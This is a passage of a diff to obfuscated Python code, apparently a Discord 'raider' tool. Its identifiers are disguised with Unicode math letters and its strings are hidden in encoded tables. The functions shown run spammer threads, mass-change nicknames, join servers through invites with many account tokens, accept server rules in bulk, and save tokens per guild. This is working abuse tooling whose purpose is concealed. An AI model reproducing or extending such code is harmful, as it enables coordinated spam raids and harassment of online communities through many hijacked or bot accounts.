+        𝘤𝗵𝘢𝘯𝗻𝘦𝙡 = 𝘉𝘋0𝘩8𝙍01𝗨3𝙐𝘇𝘨9𝘚_𝙯𝘽𝗝𝘈𝘁𝙞𝘸𝗨0𝘡𝘼𝗴2𝙪𝙨𝘋.mro()[10](𝗶𝘯𝘱𝘂𝙩(f'{𝘳}{𝘐𝙉𝙄𝘕𝗹𝙡𝘐𝘔𝘐𝗜𝗹𝘔𝘭𝘭𝗜𝙡𝘭𝗡𝗡𝗜𝙡𝘭𝘔𝙉𝙡𝙉𝙡𝘔𝘐𝙈𝘐𝗠[91]}{𝗹𝘤}{𝘐𝗡𝘐𝗡𝙡𝗹𝘐𝗠𝗜𝘐𝗹𝘔𝘭𝗹𝙄𝘭𝗹𝙉𝙉𝙄𝙡𝙡𝗠𝗡𝘭𝗡𝗹𝗠𝙄𝘔𝘐𝘔[373]}{𝘳}{𝙄𝙉𝗜𝗡𝗹𝘭𝘐𝗠𝙄𝙄𝗹𝙈𝙡𝗹𝙄𝗹𝘭𝙉𝙉𝙄𝘭𝗹𝘔𝙉𝙡𝙉𝗹𝗠𝘐𝙈𝗜𝗠[365]}'))
+        if 𝙘𝙝𝙖𝗻𝙣𝙚𝗹 == 𝘐𝙉𝙄𝗡𝙡𝙡𝘐𝗠𝗜𝙄𝙡𝗠𝗹𝙡𝗜𝘭𝘭𝙉𝙉𝘐𝗹𝗹𝘔𝗡𝘭𝗡𝗹𝗠𝗜𝗠𝘐𝘔[22]:
+            𝘔𝘦𝗻𝙪().main_menu()
+        𝗼𝘀.system(𝗜𝗡𝘐𝙉𝙡𝗹𝗜𝗠𝗜𝘐𝗹𝗠𝗹𝘭𝙄𝘭𝗹𝘕𝗡𝙄𝙡𝙡𝙈𝘕𝘭𝙉𝙡𝘔𝘐𝘔𝙄𝙈[1])
+        𝘱𝗿𝙞𝘯𝙩(𝗺𝙚𝙣𝘶)
+        for 𝘁𝗼𝘬𝗲𝙣 in 𝙩𝘰𝙠𝗲𝘯𝘀:
+            𝘵𝗵𝗿𝙚𝙖𝘥𝗶𝘯𝘨.Thread(target=𝘵𝗵𝘳𝘦𝗮𝗱_𝘀𝙥𝘢𝙢𝘮𝙚𝙧, args=(𝘵𝙤𝗸𝘦𝘯, 𝗻𝘢𝙢𝘦, 𝙘𝗵𝙖𝙣𝙣𝘦𝘭)).start()
+        𝙚𝘹𝗶𝘁 = 𝗶𝗻𝙥𝘂𝙩(𝘐𝘕𝗜𝙉𝘭𝙡𝗜𝙈𝗜𝗜𝘭𝘔𝘭𝙡𝗜𝗹𝘭𝗡𝙉𝘐𝗹𝙡𝗠𝙉𝘭𝘕𝗹𝙈𝗜𝘔𝗜𝗠[22])
+        𝗲𝘅𝘪𝙩 = 𝙈𝘦𝗻𝘂().main_menu()
+        𝘦𝘹𝙞𝘵()
 
-    @𝙬𝗿𝙖𝙥𝘱𝗲𝘳
+    @𝘸𝗿𝙖𝘱𝗽𝘦𝘳
+    def Nick(self):
+        𝗼𝘴.system(𝘐𝘕𝗜𝘕𝘭𝘭𝘐𝙈𝘐𝘐𝘭𝙈𝘭𝙡𝘐𝗹𝘭𝙉𝙉𝙄𝙡𝘭𝙈𝙉𝗹𝙉𝙡𝘔𝙄𝘔𝘐𝙈[378])
+        𝘰𝙨.system(𝘐𝘕𝗜𝘕𝗹𝙡𝘐𝘔𝙄𝗜𝙡𝗠𝙡𝗹𝙄𝙡𝙡𝘕𝗡𝙄𝙡𝗹𝗠𝘕𝗹𝘕𝗹𝗠𝗜𝙈𝙄𝗠[1])
+        𝘱𝗿𝗶𝙣𝘵(𝘮𝘦𝘯𝙪)
+        𝗴𝘂𝙞𝘭𝘥 = 𝙬37𝙙6𝙢66𝘸𝗤𝘮_𝗤𝙛𝙎𝘽𝘜𝘕𝙪_𝙇1𝙁𝙖𝘻𝗕𝗖𝘂𝘑𝗵𝗡𝗙.mro()[7](𝘪𝗻𝘱𝙪𝘵(f'{𝙧}{𝘐𝘕𝗜𝗡𝗹𝗹𝙄𝘔𝘐𝙄𝘭𝘔𝘭𝘭𝗜𝘭𝘭𝘕𝙉𝗜𝗹𝘭𝙈𝙉𝗹𝗡𝙡𝙈𝗜𝗠𝗜𝗠[91]}{𝗹𝙘}{𝗜𝘕𝙄𝗡𝗹𝗹𝙄𝗠𝙄𝘐𝘭𝗠𝙡𝗹𝘐𝙡𝙡𝘕𝘕𝘐𝘭𝙡𝗠𝘕𝗹𝗡𝗹𝗠𝙄𝘔𝘐𝗠[379]}{𝘳}{𝗜𝘕𝙄𝙉𝙡𝗹𝘐𝘔𝘐𝗜𝙡𝙈𝙡𝗹𝘐𝙡𝗹𝙉𝙉𝘐𝗹𝘭𝗠𝙉𝗹𝙉𝙡𝘔𝘐𝘔𝘐𝙈[365]}'))
+        if 𝙜𝘂𝘪𝙡𝗱 == 𝙄𝘕𝙄𝙉𝗹𝗹𝘐𝙈𝗜𝘐𝘭𝙈𝘭𝘭𝘐𝗹𝗹𝗡𝘕𝙄𝗹𝘭𝙈𝘕𝗹𝘕𝗹𝗠𝘐𝘔𝗜𝘔[22]:
+            𝙈𝘦𝘯𝙪().main_menu()
+        𝗻𝙞𝗰𝘬 = 𝗶𝘯𝘱𝘂𝙩(f'{𝘳}{𝘐𝗡𝙄𝘕𝗹𝘭𝗜𝘔𝗜𝗜𝙡𝘔𝗹𝙡𝘐𝘭𝘭𝘕𝙉𝙄𝘭𝘭𝘔𝙉𝗹𝘕𝙡𝗠𝗜𝙈𝙄𝙈[91]}{𝙡𝗰}{𝙄𝗡𝙄𝘕𝙡𝙡𝙄𝗠𝗜𝙄𝘭𝘔𝗹𝗹𝗜𝘭𝗹𝘕𝘕𝙄𝗹𝗹𝙈𝗡𝘭𝗡𝙡𝙈𝘐𝗠𝗜𝗠[380]}{𝘳}{𝘐𝙉𝙄𝗡𝗹𝙡𝗜𝘔𝙄𝙄𝙡𝗠𝘭𝘭𝙄𝘭𝘭𝙉𝗡𝗜𝗹𝙡𝗠𝘕𝗹𝗡𝙡𝘔𝘐𝙈𝙄𝘔[365]}')
+        if 𝘯𝙞𝗰𝘬 == 𝙄𝘕𝙄𝗡𝗹𝗹𝙄𝗠𝙄𝗜𝗹𝘔𝙡𝙡𝗜𝙡𝗹𝙉𝘕𝙄𝙡𝗹𝘔𝙉𝙡𝗡𝘭𝘔𝙄𝗠𝗜𝗠[22]:
+            𝙈𝙚𝙣𝙪().main_menu()
+        𝗼𝘀.system(𝘐𝗡𝗜𝙉𝙡𝙡𝘐𝘔𝗜𝘐𝘭𝗠𝙡𝘭𝘐𝙡𝗹𝙉𝙉𝙄𝗹𝙡𝙈𝙉𝙡𝗡𝙡𝗠𝘐𝗠𝘐𝙈[1])
+        𝗽𝙧𝗶𝙣𝘵(𝙢𝘦𝙣𝘶)
+        for 𝙩𝘰𝘬𝘦𝙣 in 𝙩𝘰𝘬𝘦𝘯𝘴:
+            𝙩𝘩𝗿𝙚𝙖𝘥𝗶𝘯𝘨.Thread(target=𝙢𝙖𝘴𝘀_𝗻𝙞𝙘𝙠, args=(𝘁𝙤𝗸𝙚𝗻, 𝙜𝙪𝙞𝙡𝙙, 𝘯𝙞𝙘𝘬)).start()
+        𝗲𝙭𝙞𝘁 = 𝗶𝘯𝙥𝘂𝘁(𝘐𝗡𝘐𝗡𝙡𝙡𝘐𝙈𝗜𝗜𝗹𝘔𝗹𝘭𝗜𝘭𝙡𝘕𝘕𝙄𝘭𝙡𝙈𝘕𝗹𝗡𝗹𝙈𝗜𝗠𝙄𝗠[22])
+        𝙚𝘅𝗶𝘁 = 𝙈𝗲𝘯𝙪().main_menu()
+        𝗲𝙭𝙞𝘵()
+
+    @𝘸𝘳𝘢𝘱𝙥𝗲𝘳
     def Check_guild(self):
-        𝗼𝘀.system(𝘕𝘔𝙈𝙈𝗡𝗹𝘭𝙈𝙈𝙡𝙈𝙈𝗡𝘭𝘐𝗠𝙄𝙄𝙉𝘔𝙄𝙄𝗠𝙄𝙡𝙄𝘕𝘐𝗠𝗜𝙄𝘔[388])
-        𝘰𝙨.system(𝗡𝘔𝘔𝘔𝘕𝘭𝘭𝙈𝙈𝗹𝗠𝙈𝙉𝙡𝙄𝙈𝘐𝘐𝘕𝙈𝗜𝗜𝗠𝙄𝙡𝘐𝘕𝘐𝗠𝗜𝗜𝙈[1])
-        𝗽𝗿𝘪𝘯𝘵(𝘮𝘦𝙣𝙪)
-        𝙜𝘂𝘪𝗹𝙙𝗶𝗱 = 𝗶𝘯𝗽𝘶𝙩(f'{𝘳}{𝘕𝗠𝘔𝗠𝙉𝗹𝘭𝙈𝗠𝙡𝗠𝘔𝗡𝗹𝙄𝗠𝘐𝗜𝘕𝙈𝙄𝙄𝗠𝘐𝗹𝘐𝗡𝘐𝘔𝘐𝗜𝘔[98]}{𝘭𝙘}{𝘕𝙈𝘔𝗠𝘕𝙡𝙡𝗠𝘔𝙡𝗠𝗠𝗡𝘭𝗜𝙈𝘐𝗜𝗡𝘔𝙄𝙄𝘔𝙄𝘭𝗜𝘕𝗜𝗠𝘐𝙄𝗠[386]}{𝗿}{𝙉𝘔𝙈𝘔𝗡𝗹𝙡𝙈𝗠𝗹𝗠𝘔𝙉𝙡𝙄𝗠𝙄𝘐𝙉𝘔𝗜𝘐𝙈𝙄𝗹𝙄𝘕𝘐𝗠𝘐𝗜𝙈[372]}')
-        if 𝘨𝙪𝘪𝙡𝙙𝙞𝗱 == 𝗡𝘔𝗠𝙈𝘕𝙡𝗹𝗠𝘔𝗹𝗠𝙈𝗡𝘭𝗜𝙈𝗜𝘐𝘕𝘔𝙄𝗜𝗠𝗜𝘭𝘐𝙉𝘐𝗠𝙄𝘐𝘔[29]:
-            𝙈𝘦𝘯𝘂().main_menu()
-        𝘰𝘀.system(𝗡𝗠𝗠𝙈𝗡𝘭𝗹𝘔𝙈𝘭𝗠𝗠𝘕𝗹𝙄𝙈𝘐𝘐𝙉𝙈𝙄𝗜𝘔𝙄𝙡𝘐𝘕𝙄𝙈𝘐𝘐𝙈[1])
-        𝘱𝘳𝙞𝗻𝘵(𝙢𝗲𝙣𝘂)
-        𝘴𝙖𝙫𝗲_𝘁𝘰𝗸𝗲𝗻𝙨_𝗴𝘂𝗶𝙡𝙙(𝙉𝙈𝗠𝗠𝙉𝘭𝘭𝙈𝙈𝘭𝗠𝗠𝗡𝘭𝗜𝙈𝙄𝘐𝘕𝗠𝘐𝗜𝗠𝙄𝘭𝘐𝘕𝗜𝗠𝗜𝙄𝗠[66], 𝗴𝘂𝙞𝗹𝘥𝙞𝘥)
-        𝘦𝙭𝗶𝙩 = 𝘪𝗻𝙥𝘶𝘵(𝙉𝘔𝗠𝙈𝙉𝗹𝙡𝘔𝙈𝗹𝗠𝗠𝙉𝘭𝙄𝗠𝙄𝙄𝘕𝘔𝘐𝗜𝘔𝗜𝘭𝘐𝙉𝘐𝘔𝙄𝙄𝗠[29])
-        𝙚𝙭𝗶𝘵 = 𝙈𝙚𝘯𝙪().main_menu()
-        𝘦𝘅𝗶𝘁()
+        𝘰𝘀.system(𝘐𝙉𝗜𝗡𝘭𝗹𝘐𝘔𝙄𝘐𝙡𝘔𝘭𝘭𝙄𝙡𝙡𝗡𝗡𝙄𝙡𝘭𝘔𝘕𝗹𝗡𝙡𝙈𝘐𝗠𝗜𝙈[381])
+        𝗼𝘴.system(𝘐𝙉𝘐𝙉𝗹𝘭𝗜𝘔𝙄𝙄𝘭𝘔𝙡𝙡𝘐𝗹𝗹𝘕𝘕𝗜𝗹𝙡𝘔𝗡𝙡𝘕𝙡𝘔𝙄𝗠𝘐𝗠[1])
+        𝙥𝙧𝙞𝗻𝘁(𝙢𝘦𝙣𝙪)
+        𝙜𝘂𝗶𝙡𝙙𝙞𝙙 = 𝙞𝗻𝙥𝘂𝘁(f'{𝗿}{𝘐𝘕𝗜𝙉𝙡𝙡𝗜𝗠𝙄𝘐𝗹𝗠𝙡𝙡𝗜𝙡𝘭𝘕𝘕𝘐𝗹𝘭𝘔𝙉𝙡𝙉𝘭𝙈𝗜𝗠𝘐𝗠[91]}{𝗹𝗰}{𝙄𝘕𝗜𝘕𝗹𝘭𝙄𝙈𝙄𝘐𝘭𝗠𝘭𝘭𝙄𝘭𝙡𝗡𝘕𝙄𝘭𝘭𝙈𝘕𝗹𝗡𝙡𝗠𝙄𝘔𝙄𝘔[379]}{𝘳}{𝘐𝘕𝗜𝘕𝗹𝙡𝗜𝙈𝗜𝙄𝘭𝗠𝘭𝘭𝘐𝘭𝘭𝘕𝘕𝙄𝙡𝙡𝘔𝘕𝘭𝘕𝗹𝙈𝗜𝙈𝘐𝘔[365]}')
+        if 𝙜𝙪𝗶𝙡𝘥𝙞𝙙 == 𝘐𝗡𝘐𝘕𝗹𝙡𝙄𝗠𝙄𝗜𝘭𝙈𝗹𝗹𝘐𝘭𝘭𝙉𝘕𝙄𝘭𝗹𝗠𝘕𝗹𝗡𝙡𝙈𝗜𝘔𝘐𝘔[22]:
+            𝙈𝙚𝙣𝙪().main_menu()
+        𝗼𝙨.system(𝙄𝗡𝙄𝗡𝘭𝗹𝙄𝙈𝘐𝗜𝗹𝘔𝗹𝗹𝘐𝙡𝘭𝗡𝙉𝙄𝘭𝙡𝗠𝘕𝙡𝗡𝘭𝗠𝘐𝙈𝘐𝘔[1])
+        𝙥𝗿𝘪𝘯𝘁(𝙢𝙚𝗻𝙪)
+        𝘀𝗮𝘷𝗲_𝘁𝘰𝘬𝙚𝙣𝘀_𝙜𝙪𝗶𝗹𝗱(𝗜𝗡𝘐𝘕𝘭𝘭𝗜𝙈𝙄𝘐𝘭𝘔𝙡𝘭𝙄𝗹𝘭𝗡𝘕𝘐𝙡𝙡𝘔𝗡𝘭𝘕𝙡𝙈𝙄𝗠𝗜𝘔[59], 𝗴𝘂𝗶𝘭𝙙𝗶𝘥)
+        𝗲𝘹𝗶𝘵 = 𝘪𝘯𝘱𝙪𝘵(𝗜𝘕𝘐𝘕𝗹𝙡𝙄𝘔𝙄𝙄𝙡𝗠𝙡𝗹𝘐𝘭𝙡𝘕𝘕𝗜𝗹𝙡𝗠𝙉𝘭𝗡𝗹𝙈𝙄𝘔𝙄𝘔[22])
+        𝙚𝙭𝘪𝘵 = 𝘔𝙚𝙣𝘶().main_menu()
+        𝗲𝘅𝙞𝙩()
 
-    @𝙬𝘳𝗮𝙥𝗽𝗲𝗿
+    @𝘸𝙧𝙖𝘱𝗽𝗲𝙧
     def joiner(self):
-        𝘰𝘴.system(𝘕𝗠𝘔𝘔𝙉𝙡𝘭𝙈𝙈𝘭𝙈𝙈𝗡𝗹𝗜𝗠𝗜𝗜𝗡𝘔𝗜𝗜𝗠𝘐𝙡𝘐𝗡𝘐𝙈𝗜𝙄𝙈[147])
-        𝗼𝘴.system(𝗡𝙈𝙈𝙈𝘕𝗹𝗹𝘔𝘔𝗹𝙈𝘔𝗡𝗹𝘐𝙈𝗜𝗜𝗡𝙈𝘐𝙄𝗠𝗜𝘭𝙄𝘕𝙄𝗠𝗜𝘐𝗠[1])
-        𝘱𝗿𝙞𝗻𝘵(𝗺𝗲𝘯𝘶)
-        𝘪𝘯𝙫𝙞𝘵𝗲 = 𝙞𝘯𝘱𝙪𝘁(f'{𝙧}{𝘕𝙈𝙈𝘔𝘕𝘭𝙡𝘔𝗠𝙡𝘔𝘔𝘕𝗹𝘐𝙈𝙄𝗜𝗡𝗠𝘐𝗜𝗠𝗜𝗹𝙄𝙉𝘐𝗠𝙄𝘐𝙈[98]}{𝗹𝙘}{𝘕𝗠𝙈𝘔𝙉𝘭𝙡𝘔𝙈𝙡𝗠𝘔𝘕𝗹𝗜𝘔𝙄𝗜𝗡𝙈𝗜𝘐𝗠𝗜𝗹𝗜𝙉𝙄𝘔𝘐𝗜𝙈[389]}{𝙧}{𝘕𝙈𝗠𝘔𝙉𝙡𝘭𝙈𝙈𝗹𝗠𝘔𝘕𝘭𝘐𝙈𝙄𝗜𝘕𝗠𝘐𝗜𝗠𝗜𝗹𝘐𝙉𝙄𝗠𝗜𝘐𝘔[100]}')
-        if 𝘪𝙣𝙫𝙞𝙩𝙚 == 𝗡𝙈𝗠𝗠𝙉𝗹𝗹𝙈𝗠𝙡𝘔𝙈𝙉𝙡𝗜𝗠𝘐𝘐𝙉𝗠𝘐𝗜𝙈𝘐𝙡𝗜𝙉𝗜𝗠𝗜𝙄𝗠[29]:
-            𝘔𝙚𝗻𝙪().main_menu()
-        𝗱𝘦𝙡𝗮𝙮 = 𝗵𝙦𝗤𝙒𝙇𝙌𝘤𝘵𝘷𝙎𝗟𝗸𝘖𝗔𝘝𝘳𝙊𝘁𝘢𝘊𝙕𝗖𝘋𝙗𝘾𝘝𝘩𝙎𝘶𝗫𝗙𝘪.mro()[9](𝘪𝙣𝙥𝘶𝘁(f'{𝙧}{𝗡𝘔𝗠𝙈𝙉𝘭𝗹𝘔𝙈𝙡𝙈𝘔𝗡𝙡𝘐𝙈𝘐𝗜𝙉𝗠𝙄𝙄𝗠𝙄𝘭𝗜𝗡𝙄𝙈𝗜𝙄𝗠[98]}{𝙡𝘤}{𝙉𝙈𝘔𝘔𝗡𝘭𝗹𝗠𝗠𝗹𝘔𝘔𝘕𝙡𝗜𝗠𝘐𝗜𝗡𝗠𝘐𝘐𝘔𝗜𝘭𝗜𝙉𝗜𝗠𝘐𝙄𝗠[390]}{𝗿}{𝙉𝗠𝙈𝘔𝘕𝘭𝘭𝗠𝙈𝘭𝘔𝙈𝘕𝗹𝙄𝗠𝘐𝙄𝙉𝙈𝘐𝙄𝙈𝙄𝗹𝘐𝘕𝘐𝘔𝙄𝘐𝘔[372]}'))
-        if 𝗱𝙚𝗹𝘢𝙮 == 𝙉𝗠𝙈𝘔𝘕𝗹𝘭𝘔𝙈𝘭𝗠𝙈𝘕𝗹𝙄𝙈𝙄𝘐𝘕𝘔𝗜𝗜𝙈𝙄𝘭𝘐𝗡𝗜𝘔𝘐𝙄𝙈[29]:
-            𝗠𝘦𝙣𝘂().main_menu()
-        if 𝗶𝙣𝙫𝙞𝘵𝘦.startswith(𝗡𝗠𝙈𝙈𝗡𝙡𝘭𝗠𝙈𝗹𝗠𝗠𝙉𝗹𝗜𝘔𝙄𝙄𝙉𝗠𝘐𝙄𝗠𝗜𝘭𝘐𝘕𝘐𝙈𝗜𝘐𝘔[391]):
-            𝗶𝗻𝙫𝘪𝙩𝗲_𝗻𝗮𝙢𝗲 = 𝗶𝘯𝙫𝗶𝘵𝗲.replace(𝗡𝙈𝗠𝗠𝙉𝗹𝗹𝘔𝗠𝘭𝙈𝗠𝙉𝗹𝘐𝗠𝙄𝗜𝙉𝗠𝗜𝙄𝗠𝘐𝘭𝗜𝘕𝙄𝙈𝙄𝗜𝗠[391], 𝘕𝘔𝗠𝘔𝙉𝗹𝗹𝗠𝘔𝙡𝘔𝙈𝘕𝘭𝗜𝘔𝙄𝘐𝗡𝘔𝘐𝙄𝗠𝙄𝘭𝘐𝗡𝙄𝗠𝙄𝘐𝙈[29]).split(𝙉𝙈𝘔𝘔𝘕𝘭𝗹𝗠𝗠𝗹𝘔𝙈𝙉𝘭𝘐𝗠𝘐𝗜𝘕𝘔𝗜𝗜𝘔𝗜𝗹𝘐𝙉𝘐𝘔𝗜𝘐𝙈[322])[-1]
-        else:
-            𝗶𝙣𝘃𝘪𝙩𝘦_𝘯𝗮𝙢𝗲 = 𝘪𝙣𝘃𝙞𝘵𝗲.split(𝗡𝙈𝗠𝘔𝙉𝗹𝙡𝙈𝗠𝗹𝙈𝗠𝗡𝘭𝗜𝙈𝘐𝗜𝘕𝙈𝗜𝙄𝙈𝙄𝘭𝗜𝙉𝘐𝘔𝘐𝗜𝙈[322])[-1]
-        𝘢𝙧𝗴𝘴 = [(𝙩𝗼𝙠𝘦𝘯, 𝙞𝙣𝘷𝗶𝘁𝙚_𝘯𝗮𝘮𝙚) for 𝘁𝘰𝗸𝗲𝗻 in 𝙩𝘰𝙠𝗲𝘯𝙨]
-        𝘀𝙡𝘦𝘦𝗽(𝘥𝙚𝗹𝗮𝘺)
-        𝘴𝙚𝙡𝙛.run(𝘴𝘦𝘭𝙛.raider.joiner, 𝙖𝗿𝗴𝘴)
-
-    @𝘸𝗿𝙖𝙥𝗽𝘦𝗿
-    def accept_rules(self):
-        𝙤𝘀.system(𝙉𝗠𝙈𝙈𝙉𝗹𝘭𝙈𝙈𝙡𝗠𝙈𝙉𝙡𝗜𝗠𝘐𝙄𝙉𝗠𝗜𝗜𝘔𝘐𝗹𝗜𝘕𝗜𝘔𝙄𝗜𝗠[392])
-        𝘰𝘴.system(𝘕𝗠𝘔𝙈𝙉𝘭𝗹𝘔𝗠𝙡𝘔𝙈𝘕𝘭𝗜𝘔𝙄𝙄𝘕𝙈𝗜𝙄𝘔𝗜𝗹𝘐𝘕𝙄𝙈𝘐𝙄𝘔[1])
-        𝙥𝙧𝙞𝗻𝘁(𝘮𝗲𝙣𝘂)
-        𝘴𝗲𝗿𝘷𝙚𝗿_𝘪𝗱 = 𝙞𝗻𝙥𝘶𝙩(𝗡𝗠𝙈𝗠𝘕𝙡𝙡𝗠𝘔𝘭𝙈𝘔𝙉𝗹𝗜𝗠𝗜𝙄𝗡𝗠𝘐𝙄𝙈𝗜𝘭𝙄𝘕𝗜𝙈𝙄𝗜𝙈[393])
-        if 𝘴𝘦𝗿𝘃𝙚𝘳_𝙞𝘥 == 𝙉𝗠𝘔𝗠𝘕𝗹𝘭𝙈𝙈𝘭𝘔𝘔𝘕𝗹𝙄𝙈𝘐𝗜𝗡𝗠𝙄𝙄𝙈𝗜𝗹𝗜𝗡𝗜𝗠𝙄𝙄𝘔[29]:
+        𝙤𝙨.system(𝙄𝙉𝙄𝘕𝙡𝗹𝙄𝘔𝙄𝙄𝘭𝗠𝘭𝗹𝙄𝘭𝙡𝘕𝗡𝗜𝗹𝗹𝙈𝗡𝙡𝘕𝙡𝗠𝘐𝘔𝙄𝙈[140])
+        𝘰𝘀.system(𝙄𝘕𝙄𝗡𝙡𝙡𝙄𝘔𝙄𝘐𝙡𝗠𝘭𝙡𝘐𝗹𝗹𝗡𝗡𝙄𝘭𝙡𝗠𝗡𝘭𝘕𝘭𝘔𝙄𝙈𝗜𝘔[1])
+        𝘱𝘳𝙞𝗻𝙩(𝗺𝙚𝙣𝘶)
+        𝗶𝗻𝘃𝘪𝙩𝘦 = 𝙞𝗻𝙥𝘶𝘵(f'{𝗿}{𝗜𝘕𝙄𝙉𝙡𝙡𝙄𝙈𝘐𝙄𝘭𝙈𝘭𝙡𝘐𝗹𝗹𝙉𝗡𝘐𝙡𝙡𝙈𝗡𝘭𝘕𝘭𝗠𝗜𝗠𝙄𝙈[91]}{𝗹𝗰}{𝗜𝘕𝙄𝙉𝘭𝘭𝗜𝗠𝘐𝙄𝙡𝙈𝘭𝙡𝙄𝗹𝗹𝗡𝙉𝙄𝙡𝘭𝙈𝗡𝗹𝙉𝗹𝙈𝙄𝙈𝘐𝗠[382]}{𝗿}{𝗜𝗡𝗜𝗡𝘭𝙡𝘐𝘔𝘐𝙄𝙡𝘔𝙡𝘭𝗜𝗹𝙡𝘕𝙉𝘐𝗹𝙡𝘔𝙉𝘭𝙉𝗹𝘔𝘐𝙈𝙄𝗠[93]}')
+        if 𝗶𝗻𝘷𝗶𝘵𝗲 == 𝘐𝙉𝘐𝗡𝙡𝘭𝘐𝗠𝗜𝗜𝗹𝗠𝙡𝘭𝘐𝘭𝙡𝙉𝗡𝘐𝘭𝘭𝙈𝗡𝘭𝘕𝙡𝗠𝙄𝙈𝘐𝙈[22]:
             𝘔𝙚𝘯𝙪().main_menu()
-        𝗼𝘴.system(𝘕𝗠𝘔𝙈𝙉𝘭𝙡𝘔𝗠𝙡𝙈𝗠𝗡𝘭𝙄𝙈𝘐𝙄𝘕𝗠𝙄𝗜𝗠𝙄𝘭𝗜𝗡𝗜𝘔𝙄𝙄𝙈[1])
-        𝗽𝘳𝘪𝘯𝘁(𝘮𝘦𝘯𝘶)
-        for 𝘁𝙤𝙠𝗲𝘯 in 𝘁𝙤𝗸𝙚𝙣𝘀:
-            𝘵𝘩𝙧𝘦𝘢𝙙𝙞𝙣𝙜.Thread(target=𝗮𝗰𝘤𝙚𝗽𝘵_𝗿𝘂𝘭𝙚𝘀𝘴, args=(𝘀𝗲𝗿𝘷𝗲𝘳_𝙞𝙙, 𝘁𝙤𝙠𝙚𝙣)).start()
-        𝘦𝘹𝘪𝘵 = 𝘪𝘯𝙥𝘂𝙩(𝘕𝗠𝙈𝗠𝗡𝘭𝙡𝙈𝘔𝘭𝗠𝗠𝗡𝘭𝗜𝘔𝙄𝘐𝘕𝗠𝘐𝘐𝙈𝗜𝗹𝙄𝘕𝘐𝘔𝗜𝘐𝗠[29])
-        𝘦𝘹𝘪𝘁 = 𝙈𝙚𝗻𝘂().main_menu()
-        𝗲𝘹𝙞𝘵()
+        𝗱𝗲𝙡𝗮𝘺 = 𝗙8𝘀𝘷𝗸𝘘𝗥24𝙎3𝗻𝙦𝗛6𝗥𝙓𝗝𝘛𝗪𝘷𝗨7𝙎𝙪47𝘖𝘐𝘫𝘂𝗻.mro()[8](𝙞𝗻𝙥𝙪𝘵(f'{𝘳}{𝗜𝘕𝗜𝙉𝗹𝙡𝘐𝘔𝙄𝗜𝙡𝗠𝙡𝘭𝗜𝗹𝙡𝙉𝘕𝗜𝘭𝙡𝗠𝙉𝗹𝗡𝘭𝘔𝙄𝗠𝗜𝗠[91]}{𝙡𝘤}{𝙄𝗡𝙄𝗡𝙡𝗹𝙄𝙈𝗜𝗜𝗹𝗠𝙡𝙡𝙄𝙡𝙡𝗡𝙉𝗜𝙡𝙡𝘔𝗡𝘭𝘕𝗹𝙈𝙄𝘔𝗜𝗠[383]}{𝘳}{𝘐𝗡𝗜𝗡𝗹𝘭𝗜𝗠𝗜𝗜𝘭𝙈𝙡𝘭𝘐𝘭𝙡𝙉𝗡𝘐𝙡𝘭𝘔𝘕𝗹𝘕𝘭𝗠𝗜𝗠𝙄𝙈[365]}'))
+        if 𝘥𝘦𝙡𝗮𝘆 == 𝗜𝗡𝘐𝗡𝙡𝘭𝘐𝙈𝘐𝗜𝙡𝙈𝙡𝙡𝘐𝘭𝗹𝙉𝙉𝙄𝙡𝙡𝘔𝙉𝘭𝙉𝗹𝙈𝘐𝗠𝙄𝙈[22]:
+            𝘔𝙚𝙣𝙪().main_menu()
+        if 𝗶𝘯𝘃𝗶𝙩𝗲.startswith(𝙄𝙉𝙄𝘕𝘭𝘭𝗜𝘔𝘐𝗜𝙡𝙈𝙡𝘭𝙄𝙡𝗹𝗡𝙉𝘐𝗹𝗹𝗠𝗡𝗹𝗡𝗹𝙈𝘐𝙈𝗜𝘔[384]):
+            𝙞𝙣𝙫𝙞𝘵𝗲_𝗻𝗮𝗺𝗲 = 𝗶𝘯𝘷𝗶𝘵𝙚.replace(𝘐𝗡𝘐𝙉𝙡𝙡𝗜𝗠𝗜𝘐𝘭𝘔𝘭𝘭𝗜𝘭𝘭𝙉𝘕𝙄𝙡𝘭𝙈𝗡𝙡𝗡𝘭𝘔𝘐𝙈𝙄𝗠[384], 𝘐𝘕𝙄𝗡𝙡𝘭𝙄𝘔𝘐𝗜𝙡𝗠𝙡𝘭𝙄𝘭𝘭𝘕𝙉𝗜𝗹𝗹𝗠𝘕𝙡𝙉𝙡𝙈𝗜𝗠𝙄𝗠[22]).split(𝘐𝗡𝗜𝗡𝙡𝙡𝗜𝘔𝘐𝘐𝘭𝗠𝘭𝘭𝘐𝗹𝙡𝗡𝙉𝙄𝙡𝘭𝗠𝘕𝙡𝙉𝗹𝗠𝙄𝙈𝘐𝗠[315])[-1]
+        else:
+            𝙞𝙣𝘷𝗶𝙩𝙚_𝘯𝘢𝙢𝙚 = 𝙞𝘯𝘷𝙞𝙩𝘦.split(𝗜𝘕𝙄𝘕𝙡𝘭𝘐𝘔𝘐𝙄𝗹𝙈𝘭𝙡𝙄𝘭𝘭𝙉𝙉𝗜𝗹𝘭𝘔𝙉𝘭𝗡𝘭𝘔𝗜𝙈𝙄𝘔[315])[-1]
+        𝙖𝘳𝗴𝘀 = [(𝘁𝗼𝙠𝗲𝘯, 𝗶𝘯𝘷𝗶𝘁𝗲_𝗻𝙖𝘮𝙚) for 𝘁𝙤𝗸𝗲𝗻 in 𝘵𝘰𝘬𝘦𝙣𝘀]
+        𝘀𝘭𝙚𝗲𝘱(𝗱𝙚𝘭𝘢𝙮)
+        𝙨𝘦𝙡𝘧.run(𝘴𝙚𝗹𝗳.raider.joiner, 𝙖𝙧𝘨𝘀)
 
-    @𝙬𝗿𝙖𝘱𝗽𝘦𝙧
+    @𝘸𝙧𝗮𝘱𝘱𝘦𝗿
+    def accept_rules(self):
+        𝗼𝘀.system(𝘐𝙉𝘐𝘕𝗹𝙡𝗜𝘔𝙄𝙄𝗹𝘔𝗹𝙡𝙄𝙡𝗹𝗡𝗡𝘐𝗹𝘭𝙈𝙉𝘭𝙉𝙡𝘔𝗜𝗠𝗜𝘔[385])
+        𝗼𝙨.system(𝗜𝙉𝘐𝘕𝘭𝙡𝙄𝙈𝗜𝙄𝘭𝗠𝘭𝙡𝘐𝗹𝙡𝘕𝘕𝗜𝗹𝘭𝗠𝘕𝘭𝘕𝙡𝙈𝗜𝗠𝙄𝗠[1])
+        𝙥𝘳𝗶𝗻𝘵(𝘮𝗲𝘯𝙪)
